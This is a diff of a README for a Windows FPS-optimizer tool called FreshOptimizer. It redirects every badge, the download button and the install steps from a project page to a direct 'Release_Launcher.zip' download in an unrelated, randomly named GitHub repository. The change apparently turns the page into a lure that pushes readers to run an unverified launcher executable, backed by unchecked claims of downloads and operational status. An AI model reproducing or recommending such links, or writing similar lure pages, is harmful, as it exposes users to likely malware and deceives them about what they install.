@@ -4,16 +4,16 @@
 
 <br />
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tempeststarfishtruss.github.io/fps-optimizer/)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://tempeststarfishtruss.github.io/fps-optimizer/)
-[![Downloads](https://img.shields.io/badge/Downloads-5.3k%2B-blue?style=for-the-badge)](https://tempeststarfishtruss.github.io/fps-optimizer/)
-[![Status](https://img.shields.io/badge/Status-Operational-success?style=for-the-badge)](https://tempeststarfishtruss.github.io/fps-optimizer/)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-5.3k%2B-blue?style=for-the-badge)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Status](https://img.shields.io/badge/Status-Operational-success?style=for-the-badge)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
 
 <h3>Smoother frames. Lower ping. One button.</h3>
 
 <p>FreshOptimizer tunes Windows, your network card and your power plan for <b>28 games</b>, from <b>VALORANT</b>, <b>Counter-Strike 2</b> and <b>Fortnite</b> to <b>Marvel's Spider-Man 2</b> and <b>Cyberpunk 2077</b>,<br/>then switches to full power the moment you start playing. Every change is recorded first, and one click puts it all back.</p>
 
-<a href="https://tempeststarfishtruss.github.io/fps-optimizer/"><b>Download for Windows</b></a>
+<a href="https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip"><b>Download for Windows</b></a>
 &nbsp;·&nbsp;
 <a href="#-features">Features</a>
 &nbsp;·&nbsp;
@@ -29,7 +29,7 @@
 
 ## ⚡ Get started in 30 seconds
 
-1. **Download** `Release_Launcher.exe` from the [latest release](https://tempeststarfishtruss.github.io/fps-optimizer/).
+1. **Download** `Release_Launcher.exe` from the [latest release](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip).
 2. **Install.** One click. It lands in Program Files with a Start menu shortcut.
 3. **Press Boost** once. Then just play: FreshOptimizer sits in the tray and goes full power whenever a supported game starts.
 
